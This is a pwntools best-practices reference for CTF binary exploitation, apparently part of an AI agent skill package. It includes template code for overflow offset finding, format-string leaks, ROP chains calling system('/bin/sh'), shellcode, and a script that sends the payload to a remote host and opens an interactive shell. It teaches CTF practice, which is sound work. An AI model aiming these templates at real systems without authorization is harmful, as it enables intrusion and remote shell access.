# Best Practices: Pwntools Exploitation

This document outlines best practices for using pwntools effectively in CTF and exploitation scenarios.

## Project Structure

```
exploit/
├── SKILL.md                    # Main skill file
├── reference/
│   ├── modules-overview.md     # Module reference
│   ├── best-practices.md       # This file
│   └── troubleshooting.md      # Common issues
├── skills/
│   ├── tubes-communication.md
│   ├── elf-binary-analysis.md
│   ├── rop-exploitation.md
│   ├── format-string-exploitation.md
│   └── ...                     # Other skill modules
└── examples/
    ├── buffer-overflow.py
    ├── format-string.py
    ├── rop-chain.py
    └── shellcode.py
```

## Development Workflow

### 1. Binary Analysis Phase

**Always start by understanding the binary:**

```python
from pwn import *

# Load binary
elf = ELF('./binary')

# Check protections
print(elf.checksec())
# Output:
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

# List symbols
print(elf.symbols.keys())

# Check for interesting functions
if 'win' in elf.symbols:
    print(f"win() at {hex(elf.symbols['win'])}")
```

**Protections to understand:**
- **RELRO**: Affects GOT overwrite techniques
- **Stack Canary**: Requires leak or bypass
- **NX**: Requires ROP or shellcode in writable memory
- **PIE**: Requires leak or information disclosure
- **ASLR**: Requires leak or hardcoded addresses

### 2. Vulnerability Discovery Phase

**Identify the vulnerability:**

```python
# Test for buffer overflow
p = process('./binary')
p.sendline(b'A' * 1000)
p.wait()
# Check if it crashes

# Test for format string
p = process('./binary')
p.sendline(b'%x.%x.%x.%x')
output = p.recvline()
# Check if it leaks stack values

# Test for information disclosure
p = process('./binary')
p.sendline(b'leak')
output = p.recvline()
# Check if it leaks addresses
```

### 3. Offset Finding Phase

**Use cyclic patterns, not manual counting:**

```python
# Generate pattern
pattern = cyclic(200)

# Send to binary
p = process('./binary')
p.sendline(pattern)
p.wait()

# Get crash address from GDB or core dump
crash_addr = 0x61616161

# Find offset
offset = cyclic_find(crash_addr)
print(f"Offset: {offset}")
```

**Why cyclic patterns?**
- Deterministic and reliable
- Works across architectures
- Handles alignment automatically
- Less error-prone than manual counting

### 4. Exploit Development Phase

**Build incrementally:**

```python
# Step 1: Basic payload
payload = b'A' * offset + p64(target_addr)
p.sendline(payload)

# Step 2: Add ROP chain
rop = ROP(elf)
rop.call('system', [bin_sh_addr])
payload = b'A' * offset + rop.chain()
p.sendline(payload)

# Step 3: Handle protections
# - Leak canary if needed
# - Leak libc if ASLR enabled
# - Use ROP if NX enabled
```

### 5. Testing Phase

**Test locally first:**

```python
# Local testing
p = process('./binary')
p.sendline(payload)
result = p.recvall()

# Remote testing (after local works)
r = remote('host', port)
r.sendline(payload)
result = r.recvall()
```

## Code Organization

### Separate Concerns

```python
from pwn import *

# Configuration
context(arch='amd64', os='linux')
BINARY = './binary'
HOST = 'example.com'
PORT = 1337

# Binary analysis
def analyze_binary():
    elf = ELF(BINARY)
    print(elf.checksec())
    return elf

# Exploit building
def build_exploit(elf):
    rop = ROP(elf)
    rop.call('system', [next(elf.search(b'/bin/sh'))])
    return rop.chain()

# Main exploit
def exploit(remote=False):
    elf = analyze_binary()
    payload = build_exploit(elf)

    if remote:
        p = remote(HOST, PORT)
    else:
        p = process(BINARY)

    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    exploit(remote=False)
```

### Reusable Functions

```python
def leak_bytes(p, addr, size=8):
    """Leak bytes at address using format string"""
    payload = b'%' + str(offset).encode() + b'$p'
    p.sendline(payload)
    return int(p.recvline().strip(), 16)

def find_offset(binary, pattern_size=200):
    """Find buffer overflow offset"""
    pattern = cyclic(pattern_size)
    p = process(binary)
    p.sendline(pattern)
    p.wait()
    # Get crash address and return offset
    return cyclic_find(crash_addr)

def build_rop_chain(elf, *calls):
    """Build ROP chain with multiple calls"""
    rop = ROP(elf)
    for func, args in calls:
        rop.call(func, args)
    return rop.chain()
```

## Debugging Strategies

### Enable Logging

```python
# During development
context.log_level = 'debug'

# In production
context.log_level = 'warning'
```

### Use GDB for Complex Issues

```python
# Attach GDB to running process
p = process('./binary')
gdb.attach(p, '''
    break vulnerable_function
    continue
    x/20x $rsp
''')
p.interactive()
```

### Print Intermediate Values

```python
# Debug payload construction
payload = b'A' * offset
print(f"Payload size: {len(payload)}")
print(f"Payload hex: {payload.hex()}")

# Debug ROP chain
rop = ROP(elf)
rop.call('system', [arg])
print(rop.dump())
```

## Performance Optimization

### Cache Results

```python
# Cache binary analysis
elf = ELF('./binary')
symbols = elf.symbols  # Cache symbols

# Cache ROP gadgets
rop = ROP(elf)
pop_rdi = rop.rdi  # Cache gadget

# Cache DynELF results
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
# Results are cached automatically
```

### Parallel Testing

```python
# Test multiple payloads in parallel
import threading

def test_payload(payload, name):
    p = process('./binary')
    p.sendline(payload)
    result = p.recvall()
    print(f"{name}: {result}")

payloads = [
    (payload1, "Payload 1"),
    (payload2, "Payload 2"),
]

threads = []
for payload, name in payloads:
    t = threading.Thread(target=test_payload, args=(payload, name))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

## Security Considerations

### Validate Inputs

```python
# Verify leaked addresses
if libc_addr < 0x7f0000000000 or libc_addr > 0x7fffffffffff:
    print("Invalid libc address")
    exit(1)

# Verify ROP chain
if len(rop.chain()) > max_payload_size:
    print("Payload too large")
    exit(1)
```

### Handle Errors Gracefully

```python
try:
    p.sendline(payload)
    response = p.recvline(timeout=5)
except EOFError:
    print("Process exited unexpectedly")
except Timeout:
    print("Timeout waiting for response")
except Exception as e:
    print(f"Error: {e}")
finally:
    p.close()
```

## Common Pitfalls

### 1. Not Setting Context
```python
# WRONG
code = asm('mov rax, 0x41')  # Assumes default arch

# RIGHT
context(arch='amd64')
code = asm('mov rax, 0x41')
```

### 2. Hardcoding Addresses
```python
# WRONG
payload = b'A' * 100 + p64(0x400000)  # Breaks with ASLR

# RIGHT
elf = ELF('./binary')
payload = b'A' * 100 + p64(elf.symbols['win'])
```

### 3. Not Handling Timeouts
```python
# WRONG
p.recv(1024)  # May hang forever

# RIGHT
p.recv(1024, timeout=5)
```

### 4. Mixing Architectures
```python
# WRONG
context(arch='i386')
shellcode = asm(shellcraft.sh())  # 32-bit
payload = b'A' * 100 + p64(addr)  # 64-bit packing

# RIGHT
context(arch='amd64')
shellcode = asm(shellcraft.sh())  # 64-bit
payload = b'A' * 100 + p64(addr)  # 64-bit packing
```

## Testing Checklist

Before submitting exploit:

- [ ] Works locally with `process()`
- [ ] Works remotely with `remote()`
- [ ] Handles timeouts gracefully
- [ ] Cleans up resources (closes tubes)
- [ ] Logs important values for debugging
- [ ] Validates leaked addresses
- [ ] Handles ASLR if enabled
- [ ] Handles stack canary if present
- [ ] Tested multiple times (not one-shot)
- [ ] Code is readable and maintainable

## Resources

- **Official Docs**: https://docs.pwntools.com/
- **GitHub**: https://github.com/Gallopsled/pwntools
- **Tutorials**: https://github.com/Gallopsled/pwntools-tutorial
- **Write-ups**: https://github.com/Gallopsled/pwntools-write-ups
